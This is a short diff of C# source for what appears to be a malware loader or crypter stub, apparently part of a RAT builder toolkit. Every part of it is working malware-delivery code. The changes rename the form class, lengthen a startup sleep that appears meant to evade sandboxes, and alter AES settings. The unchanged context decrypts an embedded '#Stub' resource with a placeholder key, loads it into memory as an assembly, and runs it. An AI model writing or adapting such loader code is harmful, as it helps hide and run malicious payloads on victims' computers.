@@ -28,20 +28,20 @@ namespace Loader
         {
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
-            Application.Run(new Nyan());
+            Application.Run(new Chainski());
         }
     }
 
-    public class Nyan : Form
+    public class Chainski : Form
     {
-        public Nyan()
+        public Chainski()
         {
             Initialize();
         }
 
         public void Initialize()
         {
-            Thread.Sleep(25 * 1000);
+            Thread.Sleep(60 * 1000);
             Assembly myAssembly = AppDomain.CurrentDomain.Load(AES_Decrypt(GetResource("#Stub")));
             Type myType = myAssembly.GetType("Stub.Program");
             dynamic myObj = Activator.CreateInstance(myType);
@@ -57,7 +57,7 @@ namespace Loader
                 using (RijndaelManaged AES = new RijndaelManaged())
                 {
                     AES.KeySize = 256;
-                    AES.BlockSize = 128;
+                    AES.BlockSize = 256;
                     var passwordBytes = Encoding.UTF8.GetBytes("#AesKey");
                     var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                     AES.Key = key.GetBytes(AES.KeySize / 8);
